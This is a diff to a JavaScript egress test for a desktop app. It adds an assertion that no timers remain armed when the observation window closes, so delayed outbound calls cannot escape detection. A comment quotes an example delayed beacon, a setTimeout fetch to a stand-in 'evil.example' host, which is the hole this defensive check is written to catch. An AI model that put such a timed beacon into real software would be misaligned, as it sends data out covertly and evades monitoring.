@@ -457,6 +457,23 @@ checks++;
 // The backend is the other half of the desktop process, and the half with an
 // LLM client in it. It used to be stubbed to `{}` here, which meant this whole
 // section measured electron-main alone and called that "the app's egress".
+// FOUND BY MY OWN SELF-REVIEW. Every recorded-call check above observes a
+// WINDOW, and a window can be outwaited: `setTimeout(() =>
+// fetch('https://telemetry.evil.example/late'), 9000)` produced no finding at
+// 4200ms. Raising the number only moves the goalpost — a beacon at startup+60s
+// would still be silent, and it is no less egress for being late.
+//
+// So the app's PENDING TIMERS are censused too. A recorded call answers "what
+// did it dial?"; this answers "what is it still going to do?", which no wait
+// can reach. The app schedules exactly one timer (the update check at 3000ms)
+// and it fires inside the window, so nothing may still be armed at report time.
+assert.deepStrictEqual(egress.pendingTimers, [],
+  `the main process still had timer(s) armed at ${JSON.stringify(egress.pendingTimers)}ms when the `
+  + 'observation window closed. Work scheduled past the window is invisible to every recorded-call '
+  + 'check above, which is exactly what makes it worth doing: a delayed beacon is still a beacon. '
+  + 'If a legitimate long timer is added, this check must be widened deliberately.');
+checks++;
+
 ok(egress.backendLoaded === true,
   'CONTROL: the real dist/server.cjs must be loaded during the egress run. While it was stubbed to '
   + '{}, every outbound call the BACKEND makes — the LLM provider, the scenario bank fetches, '
